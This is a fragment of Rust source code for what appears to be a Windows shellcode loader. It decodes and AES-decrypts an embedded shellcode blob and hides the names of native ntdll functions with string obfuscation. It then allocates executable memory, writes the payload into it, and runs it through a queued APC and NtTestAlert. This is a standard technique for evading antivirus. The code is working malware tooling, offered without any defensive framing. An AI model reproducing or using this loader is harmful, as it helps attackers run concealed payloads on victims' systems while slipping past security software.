


    let cipher = Cipher::new_128(&PASSWORD1);
    let shellcode = base64_decode(String::from(SHELLCODE));
    let decrypted = cipher.cbc_decrypt(PASSWORD2, &shellcode[..]);
    unsafe{
        


        let mut allocstart : *mut c_void = null_mut();
        let mut seize : usize = decrypted.len();
        


        let lib = load(obfstr!("ntdll.dll\0").as_bytes());

        let navm = get_addr(lib,obfstr!("NtAllocateVirtualMemory\0").as_bytes());
        let nwvm = get_addr(lib,obfstr!("NtWriteVirtualMemory\0").as_bytes());
        let nqat = get_addr(lib,obfstr!("NtQueueApcThread\0").as_bytes());
        let nta = get_addr(lib,obfstr!("NtTestAlert\0").as_bytes()) ;
        
        let navm: NtAllocateVirtualMemory = core::mem::transmute(navm);
        let nwvm: NtWriteVirtualMemory = core::mem::transmute(nwvm);
        let nqat:NtQueueApcThread = core::mem::transmute(nqat);
        let nta:fn() = core::mem::transmute(nta);

        navm(-1 as _,&mut allocstart,0,&mut seize, 0x00003000, 0x40);
        nwvm(-1 as _,allocstart,decrypted.as_ptr() as _,decrypted.len() as usize,null_mut());
        nqat(-2 as _,Some(std::mem::transmute(allocstart)) as _,allocstart,null_mut(),null_mut());
        nta();
       
    };



}





pub unsafe fn get_addr(hmoudule:HINSTANCE,function: &[u8])-> *mut std::ffi::c_void {

    let p = match   GetProcAddress(hmoudule, PCSTR(function.as_ptr())){
        Some(address) => address,
        None =>{FreeLibrary(hmoudule);panic!("{}",Error::from_win32())} ,
    };
    p as _
}

pub unsafe fn load(library: &[u8]) ->HINSTANCE{

    let library = match LoadLibraryA(PCSTR(library.as_ptr())){
        Ok(address) => address,
        Err(err) => panic!("{}", err),
    };

    library 
}



fn base64_decode(shellcode:String)->Vec<u8>{
    base64::decode_config(shellcode,base64::STANDARD_NO_PAD).unwrap()
}